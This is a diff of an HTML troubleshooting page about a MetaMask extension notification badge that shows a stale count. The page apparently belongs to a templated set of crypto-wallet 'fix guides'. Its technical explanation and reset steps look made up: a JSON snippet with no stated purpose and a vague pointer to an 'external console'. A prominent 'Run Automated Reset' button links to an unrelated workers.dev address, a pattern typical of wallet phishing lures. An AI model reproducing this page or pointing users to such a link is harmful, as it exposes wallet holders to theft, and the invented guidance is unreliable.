@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Notifications Notification Badge Red Num – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0f111a;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff9455; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,31 +42,33 @@
 <h1>Metamask Extension Bug Notifications Notification Badge Red Num</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The Metamask extension displays a red notification badge with a number, indicating unread notifications, but the notifications are not visible or have already been read.</li>
+<li>The user sees a persistent red notification badge on the Metamask extension icon, indicating unread notifications, even after reviewing all notifications.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the local storage of notifications and the actual notification count, often caused by an incomplete or corrupted data synchronization process.</li>
+<li>The error occurs due to a synchronization issue between the Metamask extension and the Ethereum network, causing the notification badge to malfunction and display an incorrect count.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Clear the local storage of notifications by running the following command in the browser's console: </li>
+<li>Attempt to reset the notification counter by reinstalling the Metamask extension.</li>
+<li>Clear the browser's local storage to remove any cached notification data.</li>
+<li>Use the following JSON configuration to manually reset the notification badge:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>localStorage.removeItem<span class="o">(</span><span class="s1">&#39;metaMask.notifications&#39;</span><span class="o">)</span><span class="p">;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;notifications&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;badgeCount&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<ul>
-<li>Disable and re-enable the Metamask extension to restart the notification synchronization process.</li>
-<li>Manually refresh the notifications by clicking on the Metamask icon and selecting "Refresh" from the dropdown menu.</li>
-</ul>
-<p>Consider using an external console for more advanced debugging and troubleshooting.</p>
+<p>Consider accessing the Metamask extension's internal configuration using an external console for more advanced troubleshooting.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and enabled</li>
-<li>Ethereum network selected</li>
-<li>Browser cache cleared</li>
+<li>Metamask extension installed and configured on the browser.</li>
+<li>Ethereum network connectivity.</li>
+<li>Basic understanding of browser extension management and JSON configuration.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
